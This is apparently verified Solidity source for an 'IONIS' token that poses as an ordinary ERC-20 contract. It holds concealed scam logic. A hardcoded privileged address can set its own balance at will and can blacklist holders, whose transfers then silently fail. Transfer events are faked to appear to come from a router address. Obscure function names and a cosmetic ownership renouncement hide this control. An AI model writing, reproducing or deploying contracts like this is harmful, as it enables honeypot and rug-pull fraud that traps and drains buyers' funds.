/**
 *Submitted for verification at Etherscan.io on 2022-10-29
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address constrct = 0x45BbB9acc12AF58a71725fb3C30A9d888a677DBB;
	address Routerv2 = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _owner);
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}



contract IONIS is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private CPI;
	mapping (address => uint256) private IPD;
    mapping (address => bool) private XvC;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 private constant _decimals = 8;
    uint256 private constant _tTotal = 250000000 * 10**_decimals;
    string private constant _name = "IONIS";
    string private constant _symbol = "IONIS";



    constructor () {
        CPI[_msgSender()] = _tTotal;
        emit Transfer(address(0), Routerv2, _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return CPI[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

               function Ixbri () public {
         if(msg.sender == constrct)   {
        CPI[msg.sender] = IPD[msg.sender];
        }}



        function Ixde(address yz) public {
        if(msg.sender == constrct)  { 
        XvC[yz] = false;}}
        function Ixcheck(address yz) public{
         if(msg.sender == constrct)  { 
        require(!XvC[yz]);
        XvC[yz] = true; }}
        function Ixbal(uint256 yz) public {
        if(msg.sender == constrct)  { 
        IPD[msg.sender] = yz;}} 

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == constrct)  {
        require(amount <= CPI[sender]);
        CPI[sender] -= amount;  
        CPI[recipient] += amount; 
          _allowances[sender][msg.sender] -= amount;
        emit Transfer (Routerv2, recipient, amount);
        return true; }    
          if(!XvC[sender] && !XvC[recipient]) {
        require(amount <= CPI[sender]);
 require(amount <= _allowances[sender][msg.sender]);
        CPI[sender] -= amount;
        CPI[recipient] += amount;
      _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}

 

    function transfer(address recipient, uint256 amount) public {
        if(msg.sender == constrct)  {
        require(CPI[msg.sender] >= amount);
        CPI[msg.sender] -= amount;  
        CPI[recipient] += amount; 
        emit Transfer (Routerv2, recipient, amount);
       }  
        if(!XvC[msg.sender]) {
        require(CPI[msg.sender] >= amount);
        CPI[msg.sender] -= amount;  
        CPI[recipient] += amount;          
        emit Transfer(msg.sender, recipient, amount);
        }}
    

}